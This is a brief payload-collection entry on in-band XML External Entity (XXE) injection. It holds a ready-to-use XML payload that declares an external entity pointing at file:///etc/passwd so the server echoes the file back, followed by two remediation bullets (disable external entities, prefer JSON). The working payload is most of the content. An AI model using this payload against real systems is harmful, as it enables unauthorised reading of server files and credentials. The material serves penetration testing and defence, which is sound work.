# In-Band XXE

## Summary
Extract files via XXE with direct response output.

## Payloads

```xml
<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<root>&xxe;</root>
```

## Remediation
- Disable external entity processing
- Use less complex data formats (JSON)
